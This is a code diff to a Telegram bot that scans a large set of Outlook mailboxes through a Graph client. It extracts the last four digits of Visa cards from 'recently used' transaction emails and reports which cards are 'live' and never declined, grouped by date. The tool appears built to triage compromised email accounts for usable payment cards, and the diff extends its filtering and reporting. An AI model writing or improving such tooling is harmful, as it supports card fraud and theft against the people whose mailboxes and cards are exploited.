@@ -418,43 +418,119 @@ class OutlookTelegramBot {
             }
         }
 
-        const sendFormattedVisaResults = async (chatId, results, filterLabel = '') => {
+        const formatDateVN = (isoTime) => {
+            if (!isoTime) return 'Chưa rõ ngày';
+            const d = new Date(isoTime);
+            if (isNaN(d.getTime())) return 'Chưa rõ ngày';
+            const parts = new Intl.DateTimeFormat('en-GB', {
+                timeZone: 'Asia/Ho_Chi_Minh',
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric'
+            }).formatToParts(d);
+            const day = parts.find(p => p.type === 'day')?.value || '01';
+            const month = parts.find(p => p.type === 'month')?.value || '01';
+            const year = parts.find(p => p.type === 'year')?.value || '2026';
+            return `${day}/${month}/${year}`;
+        };
+
+        const dateSortKey = (ddmmyyyy) => {
+            const m = String(ddmmyyyy).match(/^(\d{1,2})\/(\d{1,2})\/(\d{4})$/);
+            if (!m) return 0;
+            return parseInt(`${m[3]}${m[2].padStart(2, '0')}${m[1].padStart(2, '0')}`, 10);
+        };
+
+        const buildSingleTableText = (dateLabel, items) => {
+            const uniqueEmails = new Set(items.map(x => x.email));
+            const allUniqueCards = [...new Set(items.map(x => x.card))];
+            const neverDeclinedUnique = [...new Set(items.filter(x => x.neverDeclined).map(x => x.card))];
+
+            let msg = `💳 *KẾT QUẢ LỌC THẺ VISA (KHÔNG BỊ DECLINED)*\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `📅 Ngày: *${escapeMarkdown(dateLabel)}*\n`;
+            msg += `📧 Số hộp thư có thẻ sống: *${uniqueEmails.size}*\n`;
+            msg += `🔢 Tổng số đuôi thẻ (4 số): *${allUniqueCards.length}*\n`;
+            msg += `💎 Chưa từng bị Declined lần nào (${neverDeclinedUnique.length}): \`${neverDeclinedUnique.join(', ') || 'Không có'}\`\n\n`;
+            msg += `📋 *Danh sách toàn bộ mã 4 số (used online/phone):*\n`;
+            msg += `\`${allUniqueCards.join(', ')}\``;
+            return msg;
+        };
+
+        const sendFormattedVisaResults = async (chatId, results, mode = 'latest') => {
             if (!results || results.length === 0) {
                 return safeSendMessage(this.bot, chatId, '📭 Không tìm thấy email thẻ Visa nào có giao dịch thành công (không bị DECLINED).');
             }
 
-            const allUniqueCards = [...new Set(results.flatMap(r => r.cards.map(c => c.card)))];
-            const neverDeclinedUnique = [...new Set(results.flatMap(r => r.cards.filter(c => c.neverDeclined).map(c => c.card)))];
-
-            let headerMsg = `💳 *KẾT QUẢ LỌC THẺ VISA (KHÔNG BỊ DECLINED)*${filterLabel ? ` - ${escapeMarkdown(filterLabel)}` : ''}\n`;
-            headerMsg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-            headerMsg += `📧 Số hộp thư có thẻ sống: *${results.length}*\n`;
-            headerMsg += `🔢 Tổng số đuôi thẻ (4 số): *${allUniqueCards.length}*\n`;
-            headerMsg += `💎 Chưa từng bị Declined (${neverDeclinedUnique.length}): \`${neverDeclinedUnique.join(', ') || 'Không có'}\`\n\n`;
-            headerMsg += `📋 *Danh sách mã 4 số (used online/phone):*\n\`${allUniqueCards.join(', ')}\`\n\n`;
-            headerMsg += `💡 _Gõ /visa 3158 để tìm theo 4 số, /visa email@outlook.com để kiểm tra 1 mail, hoặc /visa scan để quét làm mới toàn bộ._\n`;
-            headerMsg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-
-            let currentChunk = headerMsg;
-            for (let idx = 0; idx < results.length; idx++) {
-                const r = results[idx];
-                const cardStr = r.cards
-                    .map(c => c.neverDeclined ? `*${c.card}* 💎` : `*${c.card}*`)
-                    .join(', ');
-                const rawSample = (r.cards[0]?.preview || '').replace(/\s+/g, ' ').trim().slice(0, 100);
-                const sample = escapeMarkdown(rawSample);
-                const line = `${idx + 1}. \`${escapeMarkdown(r.email)}\` → 💳 ${cardStr}\n   └ ${sample}\n\n`;
-
-                if (currentChunk.length + line.length > 3600) {
-                    await safeSendMessage(this.bot, chatId, currentChunk, { parse_mode: 'Markdown' });
-                    currentChunk = '';
+            // Flatten all cards with their date & email, sorted newest timestamp first
+            const flatCards = [];
+            for (const r of results) {
+                for (const c of (r.cards || [])) {
+                    const ts = c.time ? new Date(c.time).getTime() : 0;
+                    flatCards.push({
+                        email: r.email,
+                        card: c.card,
+                        neverDeclined: Boolean(c.neverDeclined),
+                        time: c.time || null,
+                        ts: isNaN(ts) ? 0 : ts,
+                        dateStr: formatDateVN(c.time)
+                    });
                 }
-                currentChunk += line;
             }
 
-            if (currentChunk) {
-                await safeSendMessage(this.bot, chatId, currentChunk, { parse_mode: 'Markdown' });
+            if (flatCards.length === 0) {
+                return safeSendMessage(this.bot, chatId, '📭 Không tìm thấy thẻ Visa nào.');
             }
+
+            flatCards.sort((a, b) => b.ts - a.ts);
+
+            // Group by dateStr
+            const byDate = new Map();
+            for (const item of flatCards) {
+                if (!byDate.has(item.dateStr)) {
+                    byDate.set(item.dateStr, []);
+                }
+                byDate.get(item.dateStr).push(item);
+            }
+
+            const sortedDates = Array.from(byDate.keys()).sort((a, b) => dateSortKey(b) - dateSortKey(a));
+
+            if (mode === 'all') {
+                // Separate table per date (newest to oldest), never lumping dates together
+                let output = '';
+                for (const d of sortedDates) {
+                    const block = buildSingleTableText(d, byDate.get(d)) + '\n\n';
+                    if (output.length + block.length > 3800) {
+                        await safeSendMessage(this.bot, chatId, output.trim(), { parse_mode: 'Markdown' });
+                        output = '';
+                    }
+                    output += block;
+                }
+                if (output.trim()) {
+                    await safeSendMessage(this.bot, chatId, output.trim(), { parse_mode: 'Markdown' });
+                }
+                return;
+            }
+
+            // Check if mode is a specific date filter (e.g. "13/11" or "13/11/2026")
+            if (mode && mode !== 'latest') {
+                const matchedDate = sortedDates.find(d => d.startsWith(mode) || d === mode);
+                if (!matchedDate) {
+                    return safeSendMessage(
+                        this.bot,
+                        chatId,
+                        `📭 Không có thẻ Visa nào trong ngày *${escapeMarkdown(mode)}*.\n📅 Các ngày hiện có: \`${sortedDates.join(', ')}\``,
+                        { parse_mode: 'Markdown' }
+                    );
+                }
+                const text = buildSingleTableText(`${matchedDate}`, byDate.get(matchedDate));
+                return safeSendMessage(this.bot, chatId, text, { parse_mode: 'Markdown' });
+            }
+
+            // Default: ONLY the newest date (never lumping old dates together)
+            const latestDate = sortedDates[0];
+            const latestItems = byDate.get(latestDate) || [];
+            const text = buildSingleTableText(`${latestDate} (Mới nhất)`, latestItems);
+            return safeSendMessage(this.bot, chatId, text, { parse_mode: 'Markdown' });
         };
 
         this.bot.onText(/^\/visa(?:@\w+)?(?:\s+(.+))?$/, async (msg, match) => {
@@ -462,18 +538,26 @@ class OutlookTelegramBot {
             const arg = match?.[1]?.trim().toLowerCase();
 
             try {
-                // 1. Instant response from cache if no argument provided
+                // 1. Default (/visa): Instant newest-date table from cache
                 if (!arg && Array.isArray(global.visaResultsCache) && global.visaResultsCache.length > 0) {
-                    return await sendFormattedVisaResults(chatId, global.visaResultsCache);
+                    return await sendFormattedVisaResults(chatId, global.visaResultsCache, 'latest');
                 }
 
-                // 2. Filter by 4-digit card number (e.g. /visa 3158)
-                if (arg && /^\d{4}$/.test(arg) && Array.isArray(global.visaResultsCache) && global.visaResultsCache.length > 0) {
-                    const matched = global.visaResultsCache.filter(r => r.cards.some(c => c.card === arg));
-                    return await sendFormattedVisaResults(chatId, matched, `Thẻ ${arg}`);
+                // 2. /visa all: Show each date separated (not lumped together)
+                if (arg === 'all' && Array.isArray(global.visaResultsCache) && global.visaResultsCache.length > 0) {
+                    return await sendFormattedVisaResults(chatId, global.visaResultsCache, 'all');
                 }
 
-                // 3. Live scan (either for a single email `/visa user@outlook.com` or full `/visa scan`)
+                // 3. Filter by date (e.g. /visa 13/11 or /visa 12/11/2026)
+                if (arg && /^\d{1,2}\/\d{1,2}(?:\/\d{4})?$/.test(arg) && Array.isArray(global.visaResultsCache) && global.visaResultsCache.length > 0) {
+                    const parts = arg.split('/');
+                    const normalized = parts.length === 2
+                        ? `${parts[0].padStart(2, '0')}/${parts[1].padStart(2, '0')}`
+                        : `${parts[0].padStart(2, '0')}/${parts[1].padStart(2, '0')}/${parts[2]}`;
+                    return await sendFormattedVisaResults(chatId, global.visaResultsCache, normalized);
+                }
+
+                // 4. Live scan (/visa scan or /visa refresh or /visa email@outlook.com)
                 let query = { status: 'active' };
                 if (arg && arg.includes('@')) {
                     query = { email: arg };
@@ -487,13 +571,13 @@ class OutlookTelegramBot {
                 const statusMsg = await safeSendMessage(
                     this.bot,
                     chatId,
-                    `🔍 Đang quét trực tiếp *${accounts.length}* hộp thư để lọc thẻ *Visa ending in (XXXX)* (không bị DECLINED)...`,
+                    `🔍 Đang quét trực tiếp *${accounts.length}* hộp thư để lọc thẻ *Visa ending in (XXXX)* mới nhất (không bị DECLINED)...`,
                     { parse_mode: 'Markdown' }
                 );
 
                 const GraphClient = require('../outlook/graph');
                 const results = [];
-                const BATCH_SIZE = 25;
+                const BATCH_SIZE = 20;
 
                 for (let i = 0; i < accounts.length; i += BATCH_SIZE) {
                     const batch = accounts.slice(i, i + BATCH_SIZE);
@@ -520,7 +604,7 @@ class OutlookTelegramBot {
 
                             for (const m of msgs) {
                                 const fullText = `${m.subject || ''} ${m.bodyPreview || ''}`;
-                                const cardMatch = fullText.match(/Visa card ending in\s*\(?(\d{4})\)?/i);
+                                const cardMatch = fullText.match(/Visa card ending in\s*\(?(\d{4})\)?/i) || fullText.match(/on Card\s*\(?(\d{4})\)?/i);
                                 if (!cardMatch) continue;
 
                                 const card = cardMatch[1];
@@ -530,13 +614,8 @@ class OutlookTelegramBot {
                                     declinedSet.add(card);
                                 } else if (/was recently used/i.test(fullText)) {
                                     if (!usedCards.has(card)) {
-                                        const cleanPreview = (m.bodyPreview || '')
-                                            .replace(/_+/g, '')
-                                            .replace(/\s+/g, ' ')
-                                            .trim();
                                         usedCards.set(card, {
                                             card,
-                                            preview: cleanPreview.slice(0, 120),
                                             time: m.receivedDateTime
                                         });
                                     }
@@ -559,7 +638,7 @@ class OutlookTelegramBot {
                     if (statusMsg?.message_id && accounts.length > BATCH_SIZE && i + BATCH_SIZE < accounts.length) {
                         const done = Math.min(i + BATCH_SIZE, accounts.length);
                         await this.bot.editMessageText(
-                            `🔍 Đang quét trực tiếp: *${done}/${accounts.length}* hộp thư (Đã tìm thấy *${results.length}* mail có thẻ sống)...`,
+                            `🔍 Đang quét trực tiếp: *${done}/${accounts.length}* hộp thư...`,
                             {
                                 chat_id: chatId,
                                 message_id: statusMsg.message_id,
@@ -577,7 +656,7 @@ class OutlookTelegramBot {
                     await this.bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
                 }
 
-                await sendFormattedVisaResults(chatId, results, arg && arg.includes('@') ? arg : '');
+                await sendFormattedVisaResults(chatId, results, 'latest');
             } catch (error) {
                 console.error('❌ /visa command error:', error.message);
                 await safeSendMessage(this.bot, chatId, `❌ Lỗi khi quét thẻ Visa: ${escapeMarkdown(error.message)}`, { parse_mode: 'Markdown' });
